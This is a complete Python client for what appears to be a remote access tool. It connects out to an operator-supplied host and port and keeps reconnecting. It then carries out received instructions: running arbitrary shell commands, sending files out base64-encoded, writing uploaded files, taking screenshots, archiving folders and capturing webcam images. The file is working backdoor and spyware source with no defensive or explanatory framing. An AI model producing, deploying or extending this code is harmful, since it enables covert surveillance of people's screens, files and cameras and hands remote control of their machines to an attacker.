#!/usr/bin/env python3
# standard python libraries
import time
import subprocess
import base64
import socket
import sys
import os
import zipfile
# non-standard libraries
import mss
import cv2

class Client:
    def __init__(self):
        self.connection = Connection()
        self.exit = False

        while not self.exit:
            received = self.connection.recv(self.connection.sock).decode(self.connection.CODEC)
            command = received[0]
            attribute = received[1:].split(" @ ")

            if command == "c":
                self.execute_command(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
            elif command == "d":
                self.download_file(attribute[0])
            elif command == "u":
                self.upload_file(attribute[0])
            elif command == "s":
                self.make_screenshot(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
            elif command == "z":
                self.zip_file_or_folder(attribute[0][0], attribute[0][1:], attribute[1])
            elif command == "w":
                self.capture_camera_picture(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
            elif command == "r":
                self.connection.sock.close()
                self.exit = True

    def execute_command(self, timeout, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            process.wait(timeout=int(timeout))
            data = process.stdout.read() + process.stderr.read()
        except UnicodeDecodeError:
            data = "[-] UnicodeDecodeError"
        except subprocess.TimeoutExpired:
            data = "[-] TimeoutExpired"
        self.connection.send(data.encode(self.connection.CODEC), self.connection.sock)

    def download_file(self, path):
        try:
            with open(path, "rb") as file:
                data = base64.b64encode(file.read()) + self.connection.END_MARKER
        except FileNotFoundError:
            header = "[-] FileNotFoundError"
            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
        except PermissionError:
            header = "[-] PermissionError"
            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
        else:
            header = str(len(data)).encode(self.connection.CODEC)
            self.connection.send(header, self.connection.sock)
            self.connection.sock.send(data)

    def upload_file(self, path):
        data = self.connection.recv(self.connection.sock)
        with open(path, "wb") as file:
            file.write(data)

    def make_screenshot(self, monitor, path):
        error = "no error"
        try:
            with mss.mss() as sct:
                sct.shot(mon=int(monitor), output=path)
        except mss.exception.ScreenShotError:
            error = "[-] MonitorDoesNotExist"
        except ValueError:
            error = "[-] InvalidMonitorIndex"
        except FileNotFoundError:
            error = "[-] FileNotFoundError"
        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)

    def zip_file_or_folder(self, compression_level, path_to_open, path_to_save):
        error = "no error"
        try:
            zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
            if os.path.isdir(path_to_open):
                relative_path = os.path.dirname(path_to_open)
                for root, dirs, files in os.walk(path_to_open):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(path_to_open, os.path.basename(path_to_open))
            zip_file.close()
        except PermissionError:
            error = "[-] PermissionError"
        except FileNotFoundError:
            error = "[-] FileNotFoundError"
        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)

    def capture_camera_picture(self, camera_port, path_to_save):
        error = "no error"
        video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
        if not video_capture.isOpened():
            error = "[-] CouldNotOpenDevice"
            self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
            return
        success, frame = video_capture.read()
        if not success:
            error = "[-] UnableToCapturePicture"
        video_capture.release()
        cv2.destroyAllWindows()
        cv2.imwrite(path_to_save, frame)
        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)


class Connection:
    def __init__(self):
        self.CODEC = "utf-8"
        self.END_MARKER = "-".encode(self.CODEC)
        self.PACKET_SIZE = 1024

        HOST = "127.0.0.1"
        PORT = 10000

        if len(sys.argv) == 3:
            try:
                HOST = str(sys.argv[1])
                PORT = int(sys.argv[2])
            except ValueError:
                print("[-] InvalidCommandlineArguments")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.sock.connect((HOST, PORT))
                break
            except socket.error:
                time.sleep(30)

    def send(self, data, connection):
        data = base64.b64encode(data) + self.END_MARKER
        connection.send(data)

    def recv(self, connection):
        data = bytes()
        while not data.endswith(self.END_MARKER):
            data += connection.recv(self.PACKET_SIZE)
        return base64.b64decode(data[:-1])


if __name__ == "__main__":
    while True:
        try:
            client = Client()
            if client.exit:
                break
        except:
            pass
